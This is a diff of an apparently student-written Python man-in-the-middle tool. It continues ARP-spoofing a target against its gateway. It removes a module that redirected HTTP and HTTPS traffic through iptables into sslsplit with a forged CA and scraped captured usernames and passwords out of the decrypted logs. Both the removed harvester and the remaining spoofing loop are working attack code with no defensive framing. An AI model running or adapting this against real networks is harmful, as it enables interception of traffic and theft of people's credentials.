@@ -88,87 +88,8 @@ def getDevice(ip):
         print(element[1].psrc + "   " + element[1].hwsrc)
     print(' ')
 
-def get_information(filename, record):
-    # parse log
-    line = ""
-    log = open(filename, 'rb')
-    byte = 1
-
-    # for i in range(100):
-    while byte:
-        line = ""
-        while 1:
-            byte = log.read(1)
-            if not byte:
-                log.close()
-                break
-            # byte = str(byte)[2]
-            line = line + str(byte)[2]
-            if byte == b'\n':
-                # print("next line")
-                break
-        line = line[:len(line)-2]
-        username = line.find('username=')
-        if username != -1:
-            try:
-                # print(line)
-                # find start with find username
-                # erase username&
-                line = line[username + 9:]
-                first_and_mark = line.find('&')
-                username = line[:first_and_mark]
-
-                # erase  &password=
-                line = line[first_and_mark+10:]
-                first_and_mark = line.find('&')
-                password = line[:first_and_mark]
-                try:
-                    record[username]
-                except KeyError:
-                    print()
-                    print("Username: ",username)
-                    print("Password ",password)
-                    record[username] = password
-            except:
-                pass
-    return record
-
-def sslSplit(stop):
-    # x = 0
-    # while x < 5:
-    #     os.system("date")
-    #     x = x + 1
-    #     time.sleep(2)
-    # print("[-] sslSplit stopped")
+# def sslSplit(stop):
     
-    # obtain file path
-    pathname = os.path.realpath(__file__)
-    last = pathname.rfind('/')
-    mypath = pathname[:last]
-    # iptable config
-    os.system("sysctl -w net.ipv4.ip_forward=1")
-    os.system("iptables -t nat -F")
-    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
-    os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")
-
-    # run sslsplit
-    command =   'sslsplit -D -l ' + mypath + '/sslsplit/connections.log'\
-            ' -j ' + mypath + '/sslsplit/'\
-            ' -S ' + mypath + '/sslsplit/logdir/'\
-            ' -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080'
-    os.system(command)
-    # while loop keep search username and password
-    logpath = mypath + "/sslsplit/logdir/"
-    # used set() to record
-    # already_search = set()
-    record = {}
-    while stop() == 0:
-        onlyfiles = [f for f in listdir(logpath) if isfile(join(logpath, f))]
-        for i in onlyfiles:
-            record = get_information(logpath + i, record)
-        time.sleep(5)
-    
-    # delete iptable
 
 
 
@@ -180,14 +101,14 @@ if __name__ == '__main__':
     # print(get_mac('192.168.99.100')) 
     getDevice(address + '/' + slash)
 
-    target_ip = "172.20.10.11" # Enter your target IP
+    target_ip = "192.168.99.100" # Enter your target IP
     # gateway_ip = "192.168.99.1" # Enter your gateway's IP
     gateway_ip = gw
 
 
-    t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
-    t.start()
-    stop_threads = False
+    # t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
+    # t.start()
+    # stop_threads = False
 
     try:
         sent_packets_count = 0
@@ -196,27 +117,13 @@ if __name__ == '__main__':
             spoof(gateway_ip, target_ip) # cheat on switch to know I am target
             sent_packets_count = sent_packets_count + 2
             print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-            time.sleep(2) # Waits for two seconds
+            # time.sleep(0.5) # Waits for two seconds
     
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
         restore(gateway_ip, target_ip)
         restore(target_ip, gateway_ip)
         print("[-] Arp Spoof Stopped")
-        stop_threads = True
-        t.join()
+        # stop_threads = True
+        # t.join()
         print("stop thread")
-
-    # interface = netifaces.interfaces()[1]
-    # print('=============')
-    # print('Interface Info')
-    # print('=============')
-    # print(netifaces.ifaddresses(interface))
-    # print(' ')
-
-    # request = scapy.ARP()
-    # print('============')
-    # print('Request Info')
-    # print('============')
-    # print(request.summary())
-    # print(' ')
